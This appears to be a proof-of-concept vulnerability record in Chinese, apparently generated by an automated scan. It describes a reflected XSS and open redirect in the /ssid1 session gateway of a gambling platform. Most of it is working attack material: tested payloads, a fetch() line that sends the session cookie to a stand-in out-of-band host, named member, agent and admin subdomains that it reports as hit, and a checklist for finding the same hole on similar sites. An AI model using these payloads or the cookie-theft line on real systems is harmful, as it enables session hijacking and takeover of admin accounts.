# 博彩平台会话网关 /ssid1?url= 反射型 XSS + 开放重定向（可窃取 ssid1 会话 cookie，会员/代理/管理三端命中）

- **code**: 博彩平台会话网关-ssid1-url-反射型-xss-开放重定向-可窃取-ssid1-会话-cookie-会员-代理-管理三端命中
- **kind**: poc
- **category**: auth-bypass
- **component**: 博彩系统出租平台 会话网关 /ssid1
- **severity**: high
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.2 承载的平台三端子域上实测：GET https://example.com/ssid1?url=%27%3Balert(1)%3B%2F%2F → HTTP 200，响应体 `<SCRIPT LANGUAGE="javascript">location.href='';alert(1);//'</SCRIPT>`，payload 逐字节原样回显、无任何转义（对照基线 url=http://127.0.0.1:898/ 得 location.href='http://127.0.0.1:898/'）；同样 payload 在 187536905-cct 与 177163873-cct 两个子域返回完全一致的响应（3/3）。另实测 </script><script>alert(1)</script>、javascript:alert(1)、//example.com 三种 payload 均原样回显。同类站判据（404 = 未部署）已在 xzy1.166cc.online 与主域 166cc.online 上验证。会话劫持的最终外带需受害者浏览器交互，未在本轮完成闭环，故仅确认 XSS 本身。
- **path**: pocs/博彩平台会话网关-ssid1-url-反射型-xss-开放重定向-可窃取-ssid1-会话-cookie-会员-代理-管理三端命中/ssid1_xss.txt
- **tags**: XSS,开放重定向,会话网关,ssid1,博彩平台,会话劫持,三端,跨站复用
- **created_at**: 2026-09-30T16:47:12.700Z
- **found_by**: vuln-scan

## 描述

博彩系统出租平台会话网关 /ssid1 的 url 参数反射型 XSS + 开放重定向：单引号闭合直入 location.href，可窃取 ssid1 会话 cookie；会员/代理/管理三端子域全部命中，附跨站复用判据。

## 正文

```
## 漏洞
`/ssid1` 是平台的**会话网关**（响应会 `Set-Cookie: ssid1=<32位随机hex>`），其 `url` 参数被**零过滤**地拼进一段 JS：

```
GET /ssid1?url=<payload>   →
<SCRIPT LANGUAGE="javascript">location.href='<payload>'</SCRIPT>
```

payload 用**单引号即可闭合**字符串，且服务端**不做任何 HTML 实体/反斜杠转义**。

## 已实测 payload（全部原样回显）
| payload | 响应 |
|---|---|
| `http://127.0.0.1:898/`（基线） | `location.href='http://127.0.0.1:898/'` |
| `';alert(1);//` | `location.href='';alert(1);//'` ← **JS 执行** |
| `';alert(document.domain);//` | `location.href='';alert(document.domain);//'` |
| `</script><script>alert(1)</script>` | 原样落进响应，标签闭合注入 |
| `javascript:alert(1)` | `location.href='javascript:alert(1)'` |
| `//example.com` | `location.href='//example.com'` ← **开放重定向** |

## 实战利用（会话劫持）
```
/ssid1?url=';fetch('//OOB_HOST/?c='+encodeURIComponent(document.cookie));//
```
`/ssid1` 自己就下发 `ssid1` 会话 cookie ⇒ 诱导目标点击即可外带会话凭证。
该网关部署在 **会员 / 代理 / 管理三端** 子域，**管理端被诱导点击即会话接管**。

## 命中范围（实测）
- ✅ 命中：`199634871-cct`（会员）、`187536905-cct`（代理）、`177163873-cct`（管理）—— 3/3，同一套代码
- ❌ `xzy1.166cc.online/ssid1` → nginx 原生 404（该系列未部署此文件）
- ⏱ 不可达（TLS 握手 15s+ 超时）：`*-tmz.166cc.online` 三个、`hg1/2/3-lamm166.166cc.online`、`cck8a.com`、`187536905-cct.cck8a.com`
- ❌ `166cc.online/ssid1`（主域）→ nginx 原生 404

## 快速判据（复用到同类站）
1. 平台门户首页取三端链接（该平台首页会把 `*-cct` / `*-tmz` / `hgN-lamm166` 的会员/代理/管理链接以明文 href 列出）；
2. 打 `https://<子域>/ssid1?url=%27%3Balert(1)%3B%2F%2F`；
3. 响应含 `<SCRIPT LANGUAGE="javascript">location.href=''` 即命中；返回 404 则该子域未部署。

```
